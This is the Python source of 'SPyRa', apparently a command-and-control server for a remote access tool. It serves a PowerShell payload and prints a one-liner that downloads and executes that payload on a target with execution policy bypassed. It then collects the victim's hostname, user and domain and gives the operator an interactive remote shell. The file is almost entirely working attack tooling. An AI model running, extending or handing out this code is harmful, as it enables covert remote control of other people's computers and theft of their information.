# -*- coding: utf-8 -*-

"""Main module."""

import os
import sys
import random
import string
import time
import termcolor
import socket
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from optparse import OptionParser


def outputext(message,color):
   text = termcolor.colored(str(message), str(color), attrs=["bold"])
   return text

def banner():
   banner = """\n                                                    
           .                                             
          ;Wt                    j.                      
         f#EED.       f.     ;WE.EW,                   ..
       .E#f E#K:      E#,   i#G  E##j                 ;W,
      iWW;  E##W;     E#t  f#f   E###D.              j##,
     L##LffiE#E##t    E#t G#i    E#jG#W;            G###,
    tLLG##L E#ti##f   E#jEW,     E#t t##f         :E####,
      ,W#i  E#t ;##D. E##E.      E#t  :K#E:      ;W#DG##,
     j#E.   E#ELLE##K:E#G        E#KDDDD###i    j###DW##,
   .D#j     E#L;;;;;;,E#t        E#f,t#Wi,,,   G##i,,G##,
  ,WK,      E#t       E#t        E#t  ;#W:   :K#K:   L##,
  EG.       E#t       EE.        DWi   ,KK: ;##D.    L##,
  ,                   t                     ,,,      .,, 
                                                                                           
            [ Python Recon Agent ]\n
   """
   return outputext(banner,"red")

class Requester():

  request = None
  command = None
  console_available = False
  session_received = False
  last_check = None

  def __init__(self):
    self.data = []

  def get_LastCheck(self):
    return self.last_check

  def wait_Response(self):
    self.console_available = False
    while self.console_available == False:
      time.sleep(1)

  def is_ConsoleAvailable(self):
    return self.console_available

  def is_SessionReceived(self):
    return self.session_received

  def send_Command(self,command):
    self.command = command
    return True

  def get_Command(self):
    response = self.command
    self.command = None
    return response

  def process_Request(self,request):

    path_var = request.path
    computer_info = request.headers["DATA"]
    computer_ip = request.client_address[0]
    option_var = path_var.split("/")[1]

    # Initial Request - Register computer information
    if option_var == "start":

      data = computer_info.decode('base64').split(";")
      computer_name = data[0]
      computer_user = data[1]
      computer_domain = data[2]
      computer_os = data[3]
      computer_bits = data[4]

      if not self.session_received:
        print (outputext("Received connection from: " + computer_ip,"green"))
        print (outputext("\n| HOSTNAME: "+computer_name+" \n| OS: "+computer_os+" "+computer_bits+" \n| DOMAIN: "+computer_domain+" \n| USER: "+computer_user+"\n","yellow"))
        self.session_received = True
        self.console_available = True
        self.last_check = datetime.now()
      else:
        print (outputext("\n\nReceived and ignored start request from " + computer_ip,"red"))
      request.wfile.write("1")

    # Continuous Request in order to check commands that must be executed
    
    if option_var == "check":
      if self.session_received:
        self.last_check = datetime.now()
        command = self.get_Command()
        if command != "":
          request.wfile.write(command)
          self.console_available = True
      else:
        print(outputext("Received and quitted continuous request from " + computer_ip,"red"))
        request.wfile.write("quit")

    if option_var == "return":
      data = computer_info.decode('base64')
      print (outputext(data,"green"))
      request.wfile.write("1")
      self.console_available = True

class RequestHandler(BaseHTTPRequestHandler):
    
  def _set_headers(self):

    self.send_response(200)
    self.send_header('Content-type', 'text/html')
    self.send_header('server', 'not your business')
    self.end_headers()

  def do_GET(self):

    global connection_ip

    self._set_headers()
    path_var = self.path
    ip_address = self.client_address[0]
    if "TYPE" in self.headers:
      if self.headers["TYPE"] == "L33T":
        requester.process_Request(self)
    else:
      if path_var.split("/")[1] == session_key:
        payload_filename = "payload.ps1"
        payload_session_filename = "payload_session.ps1"
        with open(payload_filename,'r') as contents:
          save = contents.read()
        with open(payload_session_filename,'w') as contents:
          contents.write('$addr = "'+connection_ip+'"') # set ip address for script
        with open(payload_session_filename,'a') as contents:
          contents.write(save)
        print (outputext("Received GET Request for script from " + ip_address, "green"))
        payload_file = open(payload_session_filename,"r")
        self.wfile.write(payload_file.read())
        os.remove(payload_session_filename)
      else:
        self.wfile.write("sorry")

  def log_message(self, format, *args):
    return

def generateKey():

  key = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
  return str("x")
  return str(key)

def monitor_Session():
    while True:
      last_check = requester.get_LastCheck()
      if last_check != None:
        now = datetime.now()
        diff = now - last_check
        if diff.seconds >= 10:
          print(outputext("\n\nQuitting: Session timeout (5) reached, computer is probably offline!","red"))
          os._exit(1)
      time.sleep(10)
    
def retrieveInputs():

  available_commands = ["test","shell","#"]

  while True:

    if requester.is_SessionReceived() and requester.is_ConsoleAvailable():

      #requester.monitor_Session()

      entry = raw_input("SPyRa >")

      if entry == "help":
        print(outputext(available_commands,"white"))

      if entry == "quit":
        break

      if entry == "test":
        requester.send_Command(entry)
        requester.wait_Response()

      if entry == "shell":
        while True:
          if requester.is_ConsoleAvailable():
            entry = raw_input("SPyRa::shell >")
            if entry != "" and entry != "quit":
              command = "shell:"+ str(entry)
              requester.send_Command(command)
              requester.wait_Response()
            else:
              break

      if entry == "#":
        entry = raw_input("SPyRa::config >")
        requester.send_Command(entry)
        requester.wait_Response()
        sys.exit()

        
session_key = generateKey()
requester = Requester()
connection_ip = None

def main():

    global connection_ip

    port = 8080
    local_ip = socket.gethostbyname(socket.gethostname())
    connection_ip = local_ip + ":" + str(port)
    payload_addr = "http://" + local_ip + ":"+str(port)+"/" + session_key
    payload_ps = "powershell.exe -exec bypass -Command IEX (New-Object system.Net.WebClient).DownloadString('"+payload_addr+"');"
    print(outputext('Starting httpd in ' + str(port),"green"))
    print(outputext('Payload: '+ payload_ps,"blue"))
    print(outputext('Waiting connections...',"white"))
    server = HTTPServer(('', port), RequestHandler)
    server_thread = threading.Thread(target = server.serve_forever)
    monitor_session_thread = threading.Thread(target = monitor_Session)
    server_thread.daemon = True
    monitor_session_thread.daemon = True

    try:
      server_thread.start()
      monitor_session_thread.start()
    except KeyboardInterrupt:
      print(outputext('Error starting server thread',"red"))
      server.shutdown()
      sys.exit(0)

    retrieveInputs()

        
if __name__ == "__main__":
    os.system("clear")
    print(banner())
    try:
      main()
    except KeyboardInterrupt:
      print(outputext('bye mr l33t!','yellow'))
      sys.exit()


